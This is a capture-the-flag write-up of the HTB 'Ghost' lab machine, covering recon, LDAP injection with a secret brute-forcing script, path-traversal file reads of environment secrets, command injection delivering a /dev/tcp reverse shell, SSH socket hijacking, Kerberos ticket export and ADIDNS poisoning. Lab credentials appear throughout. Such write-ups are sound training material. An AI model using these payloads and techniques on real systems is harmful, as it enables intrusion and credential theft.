---
icon: ghost
---

# HTB-GHOST

<figure><img src="../../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**1. Initial Access**

1. **Intranet Login Page** – The internal intranet login form was vulnerable to **LDAP Injection**, allowing authentication bypass.
2. **Internal Forum Access** – LDAP Injection granted access to an internal forum.
3. **Brute Force LDAP Secret** – A hidden LDAP secret was brute-forced, granting access to the account **gitea\_temp\_principal**.
4. **Valid Credentials for Gitea** – These credentials were used to log in to the Gitea source control system.
5. **LFI in Blog** – The internal blog had a Local File Inclusion (LFI) vulnerability, allowing retrieval of sensitive files, including the **DEV\_INTRANET\_API key**.

**2. Execution**

6. **Command Injection in Intranet** – Combining the LFI-derived API key with source code analysis revealed a command injection vulnerability, resulting in root access **inside the application container**.
7. **Credential Exposure** – Inside the container, `docker-entrypoint.sh` exposed credentials for **florence.ramirez**.

**3. Privilege Escalation**

8. **DNS Record Manipulation for Bitbucket** – Using florence’s account, the Bitbucket DNS record was modified to capture NTLMv2 hashes for **justin.bradley**.
9. **Crack NTLMv2 Hash** – The hash was cracked to obtain valid credentials for justin.bradley.
10. **Read GMSA Account Password** – From justin’s account, the NTLM hash for the `ADFS_GMSA$` account was retrieved.
11. **GoldenSAML Attack** – Using the GMSA account, a forged SAMLResponse was created to gain Administrator access over ADFS and the configuration panel.
12. **Linked MSSQL Abuse** – In the ADFS panel, the `execute_as_login` privilege on a linked MSSQL database was abused to gain access as `MSSQL` on the **PRIMARY** server.
13. **SeImpersonate Privilege Abuse** – This privilege was exploited to escalate to **NT Authority\SYSTEM** on PRIMARY.
14. **Diamond Ticket Forgery** – A forged Diamond Ticket was used in the child domain to gain **Administrator access on DC01**.

**4. Unintended Path**

15. **MSSQL Guest Session** – Florence’s account also had unintended access to an MSSQL instance as a guest.
16. **Linked MSSQL Privilege Abuse** – Even from this guest session, `execute_as_login` on the linked database could be abused to pivot to MSSQL on PRIMARY (same as step 12 above).

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-13 19:04:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2024-06-16T15:49:55
|_Not valid after:  2024-12-16T15:49:55
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-13T19:05:31+00:00
|_ssl-date: 2024-07-13T19:06:11+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51527/tcp open  msrpc         Microsoft Windows RPC
51570/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
 
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-07-13T19:05:31
|_  start_date: N/A
```

Based on the open ports identified by **nmap** I assume that this is a **Domain Controller**. RDP, LDAP and HTTPs reveal domain names, so I add `core.ghost.htb`, `dc01.ghost.htb`, and `ghost.htb` to my `/etc/hosts` file.

#### DNS <a href="#dns" id="dns"></a>

Since there was already a subdomain found by **nmap** I try to poke around DNS and resolve the second-level domain. The DNS server answers with **3** IPs, the one I already know, localhost and `10.0.0.254`, so this box might be attached to another network.

```python
nslookup ghost.htb ghost.htb
Server:         ghost.htb
Address:        10.129.207.216#53
 
Name:   ghost.htb
Address: 10.0.0.254
Name:   ghost.htb
Address: 10.129.207.216
Name:   ghost.htb
Address: 127.0.0.1
 
nslookup ghost.htb ghost.htb
Server:         ghost.htb
Address:        10.129.207.216#53
 
Name:   ghost.htb
Address: 10.0.0.254
Name:   ghost.htb
Address: 10.129.207.216
Name:   ghost.htb
Address: 127.0.0.1
 
nslookup ghost.htb ghost.htb
Server:         ghost.htb
Address:        10.129.207.216#53
 
Name:   ghost.htb
Address: 10.0.0.254
Name:   ghost.htb
Address: 10.129.207.216
Name:   ghost.htb
Address: 127.0.0.1
```

Trying to perform a zone transfer errors out, so I’ll resort to bruteforcing valid subdomains with **dnsenum**.

```python
dnsenum --enum \
        --dnsserver 10.129.207.216 \
        --subfile subdomains.txt \
        -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
        ghost.htb
--- SNIP ---
intranet.ghost.htb.                      3600     IN    A         127.0.0.1
corp.ghost.htb.                          599      IN    A         10.0.0.10
core.ghost.htb.                          3600     IN    A         127.0.0.1
gc._msdcs.ghost.htb.                     600      IN    A        10.0.0.254
gc._msdcs.ghost.htb.                     600      IN    A         10.0.0.10
gc._msdcs.ghost.htb.                     600      IN    A        10.129.207.216
domaindnszones.ghost.htb.                600      IN    A        10.0.0.254
domaindnszones.ghost.htb.                600      IN    A        10.129.207.216
forestdnszones.ghost.htb.                600      IN    A         10.0.0.10
forestdnszones.ghost.htb.                600      IN    A        10.0.0.254
forestdnszones.ghost.htb.                600      IN    A        10.129.207.216
federation.ghost.htb.                    3600     IN    A         127.0.0.1
dc01.ghost.htb.                          3600     IN    A        10.0.0.254
dc01.ghost.htb.                          3600     IN    A        10.129.207.216
```

I add the identified domains to my `/etc/hosts` as well.

#### HTTP (Port 8008) <a href="#http-port-8008" id="http-port-8008"></a>

Checking out `http://ghost.htb:8008`, I find some sort of blog powered by [Ghost](https://ghost.org/), but besides a possible username (`Kathryn Holland`) there is not much to discover

<figure><img src="../../../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

Trying another virtual host, `http://intranet.ghost.htb:8008`, returns a login screen to the **Intranet**, but instead of asking for a password one has to supply a **Secret**.

<figure><img src="../../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

### Initial Access <a href="#initial-access" id="initial-access"></a>

#### Intranet <a href="#intranet" id="intranet"></a>

Testing some obvious credentials like `admin:admin` result in a failure with an error message of **Invalid combination of username and secret** but the payload that was sent by the browser offers additional details. The username and secret are sent as `1_ldap-username` and `1_ldap-secret` respectively, so this does hint towards `LDAP injection`.

```python
// Some code-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_$ACTION_REF_1"

-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_$ACTION_1:0"
{"id":"c471eb076ccac91d6f828b671795550fd5925940","bound":"$@1"}
-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_$ACTION_1:1"
[{}]
-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_$ACTION_KEY"
k2982904007
-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_ldap-username"
admin
-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="1_ldap-secret"
admin
-----------------------------138734160426963055861003795151
Content-Disposition: form-data; name="0"
[{},"$K1"]
-----------------------------138734160426963055861003795151--

```

Using a simple bypass<sup>1</sup> with `*` for the username **and** the secret grants me access to the Intranet as `kathryn.holland` since that’s probably the first user returned by the query.

<figure><img src="../../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

The posts on the startpage talk about the _new_ intranet portal (probably this one!), where people have to login via their secret that’s decoupled from their domain password, and about an ongoing migration from **Gitea** to **Bitbucket**, where login is only possible with the `gitea_temp_principal` and its secret as the password.

<figure><img src="../../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

On the left hand side I can switch to `/users` and find a table containing _all_ the users, their name and group(s). This might come in handy later on, so I’ll add those to a list.

users.txt

```python

kathryn.holland
cassandra.shelton
robert.steeves
florence.ramirez
justin.bradley
arthur.boyd
beth.clark
charles.gray
jason.taylor
intranet_principal
gitea_temp_principal

```

There’s also `/forum` containing three more posts, one talking about problems with the connection to **Bitbucket** by `justin.bradley` and the answer from `kathryn.holland` that the DNS entry is not yet configured.

<figure><img src="../../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

Going to `/profile` only reveals a non-functioning feature to change the secret. Available soon™. From the info message I can infer that the secret needs to be between **5** and **20** characters and is limited to letters and numbers.

Bruteforce LDAP secrets

Since I know that using wildcards is possible in the login procedure I can bruteforce secrets one character at a time by appending `*` to the character to test and check if the login works. A simple script will go a long way here considering the secrets are up to **20** characters long.\
<br>

brute\_secret.py

```python

#!/usr/bin/env python3
import requests
import string
import sys
 
BASEURL = 'http://intranet.ghost.htb:8008'
 
# Required to make NextJS work
HEADERS = {
        'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D'
}
 
def check_secret(username='*', secret='*') -> bool:
    """
    Use LDAP injection to check if a secret can be used to login.
    """
    try:
        # The None in the tuple prevents the addition of the filename
        resp = requests.post(f'{BASEURL}/login',
                             headers=HEADERS,
                             files={
                                 '1_$ACTION_REF_1': (None, ''),
                                 '1_$ACTION_1:0': (None, '{"id":"c471eb076ccac91d6f828b671795550fd5925940","bound":"$@1"}'),
                                 '1_$ACTION_1:1': (None, '[{}]'),
                                 '1_$ACTION_KEY': (None, 'k2982904007'),
                                 '1_ldap-username': (None, username),
                                 '1_ldap-secret': (None, secret),
                                 '0': (None, '[{},"$K1"]')
                             },
                             allow_redirects=False)
    except requests.exceptions.RequestException as error:
        print(error)
        return False
    
    return resp.status_code == 303
 
def main():
    try:
        username = sys.argv[1]
    except IndexError:
        print(f'Usage {sys.argv[0]} <username>')
        sys.exit(1)
 
    secret = ''
    for _ in range(20):
        for c in string.ascii_letters + string.digits:
            if check_secret(username=username, secret=secret + c + '*'):
                secret += c
                break
        else:
            break
 
    print(f'User {username} has secret "{secret}"')
 
 
if __name__ == '__main__':
    main()

```

Running the above script for `gitea_temp_principal` returns `szrr8kpc3z6onlqf` as the secret.

#### Gitea <a href="#gitea" id="gitea"></a>

The previous [DNS bruteforce](https://blog.ryuki.dev/ctf/htb/machines/season-5/ghost#dns) did not reveal a subdomain for the version control, but the intranet is talking about setting up a DNS entry for Bitbucket. Taking a wild guess here I try to resolve `gitea.ghost.htb` via the _Domain Controller_ and receive a response. Even though it specifies `127.0.0.1` I’ll add the domain to my hosts file and try to access `http://gitea.ghost.htb`.

```python
nslookup gitea.ghost.htb ghost.htb
Server:         ghost.htb
Address:        10.129.207.216#53
Name:   gitea.ghost.htb
Address: 127.0.0.1
```

This works and I can login with `gitea_temp_principal:szrr8kpc3z6onlqf` and get access to the source code for the `ghost-dev` organization with 2 repositories `blog` and `intranet`. They likely correspond to the applications I already saw.

<figure><img src="../../../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

**blog**

The **README.md** repository for the _main_ domain **ghost.htb** talks about an upcoming feature, some inter-connection between intranet through which URLs will be _scanned_. It uses key from the environment variable `DEV_INTRANET_KEY`, but that’s nowhere to be found, neither in the `Dockerfile` nor the `docker-compose.yml`. Additionally there seems to be another feature within `posts-public.js` that allows to retrieve additional information from a post. It does also mention an key (`a5af628828958c976a3b6cc81a`) for the public API.

<figure><img src="../../../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

Checking the source code for `posts-public.js` there is an interesting passage within the `module.exports`. If there’s a parameter `extra` in the request, the value is appended to `/var/lib/ghost/extra/` and the contents of that file is returned within the response. Notably there is no sanitization in place and in case the same code is running on the server, I can use it to read arbitrary files.

posts-public.js

```python

async query(frame) {
    const options = {
        ...frame.options,
        mongoTransformer: rejectPrivateFieldsTransformer
    };
    const posts = await postsService.browsePosts(options);
    const extra = frame.original.query?.extra;
    if (extra) {
        const fs = require("fs");
        if (fs.existsSync(extra)) {
            const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
            posts.meta.extra = { [extra]: fileContent };
        }
    }
    return posts;
}

```

The extra parameters has to be supplied via the API in Ghost and it offers a nice [documentation](https://ghost.org/docs/content-api/) specifying the URL and query parameters. I need to supply an API key via `?key=` and luckily I’ve already seen one in the README. The code snippet mentions **posts** so I’ll try that endpoint first. Using `&extra=../../../../../../../etc/passwd` has the desired effect and the contents of the `passwd` file is returned to me.

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../../etc/passwd | jq .
--- SNIP ---
    "extra": {
      "../../../../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
    }
  }
}
```

Considering the instructions in the **README** I check for environment variables next and those are contained in `/proc/self/environ` with _self_ being a link to current process.

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../../../proc/self/environ | jq .
"extra": {
      "../../../../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
}
```

`DEV_INTRANET_KEY` succesfully obtained: `!@yqr!X2kxmQ.@Xe`!

### Execution <a href="#execution" id="execution"></a>

First I validate the finding by sending `;id` and voilà there’s the output of the `id` command **and** its running as root!

```python
curl -sS \
     -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' \
     -H 'Content-Type: application/json' \
     --data '{"url": ";id"}' \
     'http://intranet.ghost.htb:8008/api-dev/scan' | jq .
 
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

Time to get a reverse shell, so I’ll change the payload to `;sh -i >& /dev/tcp/10.10.10.10/31337 0>&1` and start a listener with `nc -lnvp 31337`.

```python
curl -sS \
     -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' \
     -H 'Content-Type: application/json' \
     --data '{"url": ";sh -i >& /dev/tcp/10.10.10.10/31337 0>&1"}' \
     'http://intranet.ghost.htb:8008/api-dev/scan' | jq .
 
nc -lnvp 31337
listening on [any] 31337 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.207.216] 49774
sh: 0: can't access tty; job control turned off
# whoami
root
```

```python
curl -sS \
     -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' \
     -H 'Content-Type: application/json' \
     --data '{"url": ";sh -i >& /dev/tcp/10.10.10.10/31337 0>&1"}' \
     'http://intranet.ghost.htb:8008/api-dev/scan' | jq .
 
nc -lnvp 31337
listening on [any] 31337 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.207.216] 49774
sh: 0: can't access tty; job control turned off
# whoami
root
```

After upgrading my shell<sup>2</sup> I look around but flags are nowhere to be found. I’m trapped in a **docker** container, easily identifiable thanks to the presence of `/.dockerenv` and `/docker-entrypoint.sh`.

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

The `docker-entrypoint.sh` in the / directory of the container shows what’s being run during the startup.

```python
#!/bin/bash
 
mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/h:%%p\n  ControlPersist yes' > /root/.ssh/config
 
exec /app/ghost_intranet
```

The `controlmaster` setting within the SSH config enables reusage of a previously established connection. Checking the sessions in `/root/.ssh/controlmaster` shows only one for `florence.ramirez@ghost.htb` to `dev-workstation`. This means I can probably connect there **without** knowing the password.

```python
ls -la /root/.ssh/controlmaster/
total 12
drwxr-xr-x 1 root root 4096 Aug 11 18:59 .
drwxr-xr-x 1 root root 4096 Jul  5 15:17 ..
srw------- 1 root root    0 Aug 11 18:59 florence.ramirez@ghost.htb@dev-workstation:22
 
ssh florence.ramirez@ghost.htb@dev-workstation
florence.ramirez@LINUX-DEV-WS01:~$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```

Based on the naming scheme of the user, the `dev-workstation` is probably domain-joined and fair enough there’s a KRB5CCNAME environment variable set and it does point to `/tmp/krb5cc_50`. I grab the file as a base64 string to move it to my machine.

```python
env
SHELL=/bin/bash
PWD=/home/GHOST/florence.ramirez
KRB5CCNAME=FILE:/tmp/krb5cc_50
LOGNAME=florence.ramirez
MOTD_SHOWN=pam
HOME=/home/GHOST/florence.ramirez
SSH_CONNECTION=172.18.0.3 44372 172.18.0.2 22
TERM=screen
USER=florence.ramirez
SHLVL=1
LC_CTYPE=C.UTF-8
SSH_CLIENT=172.18.0.3 44372 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
SSH_TTY=/dev/pts/0
_=/usr/bin/env
 
cat /tmp/krb5cc_50 | base64 -w0
BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNBQ0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAAaa3JidGd0L0dIT1NULkhUQkBHSE9TVC5IVEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEyAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAgAAAAIAAAAJR0hPU1QuSFRCAAAABmtyYnRndAAAAAlHSE9TVC5IVEIAEgAAACDYyfzyu4OjGV2cH044Abrth1+2ZL1ElmTVXgS1T3iZXma5EilmuRIpZrmeyWa6Y6kAAOEAAAAAAAAAAAAAAAAE6mGCBOYwggTioAMCAQWhCxsJR0hPU1QuSFRCoh4wHKADAgECoRUwExsGa3JidGd0GwlHSE9TVC5IVEKjggSsMIIEqKADAgESoQMCAQKiggSaBIIElqLvevbBXU9TDMCw1Sbqf8Ub1yl04jFTqE866Pg4ti2urZhFfbnNACASR1cHe+YtOtcOV8oKMz/4LW5p1/ZpuJ8BjGLpjDLyF2GtOrp/DHcJ4Nk4rlLB2WWM0XqugN7VMDPivTZIFQ9v1dhD78ilnH4E/VsQiDoawKEC5d9nTIdzAIopqbA1LTvkiUPoJOWAENjPg6kpT4DozjqCwVrWJWNfc6vOLKq1EhLStcTHZmLZwzLfiisP4QqNwkdrlaLpmeOJQpzklGw6wWbuGApeaLrf6sNeXgaN73rWFdTXN9u3ePai1o5fK7V4CSOpPrFlbhTZtuVXx1TdFU9YsaA1Ss7vbehCkNiUFUDlUCdA8apBF3NbqFMwyxGsheulaA84ubnyzeCHL9/VkhXrK1RuFWl4455AHz7YsaPXHCZeOjRfXe1Sc0hWu8rXr5ELvZJ6HIxbXuaS+3PLIPYqc7IienpZ1THiJ6pzbE4F4rFWXfFnKHoSvWbF+ju2reHMVN8mQ3I0WD/VXapstuwHXwuwfScINA33X8Qcy4zxxEDF/qqlHXwmWlLbWCA5RzFmE6eWSBe+WirSDiqWLOuEc386azl4YxiqpUpOmkkLjYIrAR1NvYXPqOUTExgA3oTOcYqqsRYDxJv0o3INUbrkcvvbZ9kQxWHeVruKit0WTzX+h2YhnTJlRdsrbF4hsOx7cAWxby55Nka15y6E4w+IV3iMbCWfNw1NMLTM0VNfzSwAl2IM2FZEYUiFwVh5KJQhsxliKFQAGh1MlerGO564kOASyqN5BLoYTy4mIEl/Z7QtQR2aOjl6rXGEKjOMoMvJh74953cUZla6pB4Fxpi44Xwh5z70JlJZGi3FpAVkgd78+I6ZhmVsaRPWtY8kM1HZm+gS1Xeb2VHYGLOewMCs2TldrB3F400TSY+GKscsaNTsvfGjVOn2tZbH+5Afz2DuqZVWiEq0eS3x1F8ZJi6k6bgQd1q9JZXrrBJSZqW6HycKW18W8DyOFYvelzyjZFR7kx7f/snxvehzxw6NijqFxw0cdyP+ehtdyHlOSpGML2OEFA1rMuQdkMhoLEB3EsMrrB59sd3618bMC/fbibKcUGr7YXlkXqo765pARjDq3TWnK8aE1I8jZoLDguuetz9FlhlogkDvjjA7LFbWLiLMKs660ZS91b8ghvvAjkzdNkd4/6dslSmuTF9MM8K8uvxihMjLXEydiE1InucrdgeqhDLWc4MnYw0ggKgbyxShGeoyxSYn1SiyImR/uiAB+ON4lZzo7aOJ6LP8vazb5YOIKKOCzU4Fwd0BW5EYaWcjaBevIZdRuwZsXXb+hHYaKLVTcSt51FrzXJmVEEB1VWZ6MzYDhxqc+AE9G2iwa9xDoUF+wzxYgYIsG47XUwHeakUvCRPvC1pvO2bdnXJXXhFQ/X4TRusgkH3mF0DAPUzCkg6aYhfDnByjSvqegz2RYo6j7eJAovQkAPH2gxLTtA4PfkGDnlG7UGMjRuAlk+NsmOrTeKGTniSeBZtz34PrnyG5oh67SJqamw+wthPX3wYdyURtf+NxFboDBY0AAAAA
```

> \
> Info
>
> The docker container also exposes credentials for another user in the environment variables
>
> ```
> env--- SNIP ---LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htbLDAP_HOST=ldap://windows-host:389LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j--- SNIP ---
> ```
>
> In a previous version of the box, the plaintext credentials for the `florence.ramirez` user were contained within the `/docker-entrypoint.sh`.\
> `sshpass -p 'uxLmt*udNc6t3HrF' ssh -o "StrictHostKeyChecking no" florence.ramirez@ghost.htb@dev-workstation exit`

#### BloodHound <a href="#bloodhound" id="bloodhound"></a>

With the newly obtained _credentials_ for a domain user, I’ll run [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) to get an overview over the domain.

```python
bloodhound-python -d ghost.htb \
                  -u florence.ramirez \
                  -k \
                  -ns 10.129.207.216 \
                  --dns-tcp \
                  --dns-timeout 100 \
                  -c ALL
INFO: Found AD domain: ghost.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 16 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: linux-dev-ws01.ghost.htb
INFO: Querying computer: DC01.ghost.htb
WARNING: Could not resolve: linux-dev-ws01.ghost.htb: All nameservers failed to answer the query linux-dev-ws01.ghost.htb.localdomain. IN A: Server Do53:10.129.207.216@53 answered SERVFAIL
INFO: Done in 00M 14S
```

After loading the data into **BloodHound**, I poke around trying to find some interesting edges that I can abuse. Even though my current user `florence` is part of the `IT` group, BloodHound did not identify relevant privileges over other objects. Searching for `kerberoastable` user returns `ADFS_GMSA$` and another user `justin.bradley` that has the ability to read the password of that account.

<figure><img src="../../../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

Also the name of the _group managed service account_ hints towards [Active Directory Federation Service](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/understanding-key-ad-fs-concepts) and sure enough I have not investigated port `8443`. Catching up on that and browsing to `https://core.ghost.htb:8443/login` reveals that it’s in fact **ADFS** and I can use my credentials to login there. Unfortunately I need to be `Administrator` to proceed further according to the welcome screen.

\
So the path forward seems clear, somehow take over `justin.bradley`, read the password of `ADFS_GMSA$` and then compromise **ADFS** with a [Golden SAML](https://www.netwrix.com/golden_saml_attack.html) attack.

#### ADIDNS <a href="#adidns" id="adidns"></a>

Thinking back at the information I’ve gathered in the [intranet](https://blog.ryuki.dev/ctf/htb/machines/season-5/ghost#intranet), I remember that `justin.bradley` talked about problems regarding the access to **Bitbucket** and that the DNS record was not yet set up. By default any authenticated user can add new DNS entries within the `Active Directory Integrated DNS (ADIDNS)`<sup>3</sup>. Resolving `bitbucket.ghost.htb` returns **NXDOMAIN** so the entry is currently not populated. I’ll try my luck with **bloodyAD**.

```python
bloodyAD --host dc01.ghost.htb \
         -k \
         -d ghost.htb \
         add dnsRecord \
         --dnstype A \
         --ttl 2 \
         bitbucket \
         10.10.10.10
[+] bitbucket has been successfully added
 
nslookup bitbucket.ghost.htb ghost.htb
Server:         ghost.htb
Address:        10.129.207.216#53
 
Name:   bitbucket.ghost.htb
Address: 10.10.10.10
 
nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.207.216] 49319
